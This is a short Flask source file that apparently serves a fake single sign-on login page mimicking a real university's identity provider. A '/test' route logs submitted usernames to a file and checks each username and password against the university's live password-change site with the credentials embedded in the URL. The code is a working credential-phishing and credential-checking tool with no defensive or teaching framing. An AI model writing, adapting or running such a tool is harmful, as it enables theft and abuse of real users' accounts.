from flask import Flask, render_template, request, redirect, abort
import requests
app = Flask(__name__)

@app.route("/test")
def test_password():
    username = request.args.get('username')
    password = request.args.get('password')
    with open("accounts.txt", "a") as myfile:
        myfile.write(username + " " + "password" + "\n")
    s = "https://"+username+":"+password+"@start.rit.edu/ChangePassword/"
    r = requests.get(s)
    print(r.status_code)
    if r.status_code == 200:
        return "True"
    else:
        abort(400)

@app.route("/idp/profile/SAML2/Redirect/SSO") #correct url
def form():
    return render_template('index.html')

@app.route("/")
def index():
    return redirect("/idp/profile/SAML2/Redirect/SSO", code=302)

if __name__ == '__main__':
   app.run('0.0.0.0', port=80)
